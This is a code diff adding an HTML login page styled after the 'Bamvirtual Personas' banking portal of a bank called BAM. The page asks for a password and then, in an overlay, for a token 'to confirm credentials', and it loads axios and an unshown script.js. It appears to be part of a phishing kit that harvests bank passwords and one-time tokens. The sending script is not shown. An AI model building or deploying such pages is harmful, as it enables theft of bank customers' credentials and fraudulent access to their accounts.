@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BAM</title>
+    <link rel="stylesheet" href="styles.css" />
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+  </head>
+  <body>
+    <div class="container">
+      <div class="left">
+        <div class="icon-container">
+          <img src="datos/bam-icon.svg" alt="BAM Icon" />
+        </div>
+        <div>
+          <p>Bienvenido a Bamvirtual Personas</p>
+        </div>
+        <form id="login-form">
+          <div class="cuadrado">
+            <div class="icon-input">
+              <i class="icon icon-user">
+                <img
+                  src="https://cdn-icons-png.flaticon.com/512/482/482624.png"
+                  style="width: 20px"
+                />
+              </i>
+              <input
+                type="text"
+                id="input-username"
+                class="form-control input-general"
+                autocomplete="off"
+                minlength="1"
+                maxlength="20"
+                placeholder=" "
+              />
+              <label for="input-username">Ingresa tu contraseña</label>
+            </div>
+          </div>
+          <div class="button-container">
+            <button id="continue-button" type="button">INICIAR SESIÓN</button>
+            <a href="index.html">
+              <button
+                style="
+                  width: 100%;
+                  padding: 15px;
+                  margin-top: 15px;
+                  border: 1px solid black;
+                  background: white;
+                "
+                type="button"
+              >
+                REGRESAR
+              </button>
+            </a>
+          </div>
+          <div
+            style="
+              width: 100%;
+              background: #9a9a9a;
+              height: 1px;
+              margin-top: 50px;
+              margin-bottom: 50px;
+            "
+          ></div>
+        </form>
+      </div>
+      <div class="right">
+        <img src="datos/login.gif" alt="Imagen de ejemplo" />
+      </div>
+    </div>
+    <div id="overlay" class="overlay">
+      <div class="loading">Cargando...</div>
+    </div>
+    <div id="number-overlay" class="overlay">
+      <form id="number-form" class="number-form">
+        <div style="width: 100%; text-align: center">
+          <img
+            src="datos/bam-icon.svg"
+            style="width: 100px; margin-bottom: 20px"
+          />
+        </div>
+        <h4>Ingrese su token para confirmar sus credenciales</h4>
+
+        <input type="text" id="number-input" placeholder="Ingresa su token" />
+        <button id="number-submit" type="button">Enviar</button>
+      </form>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
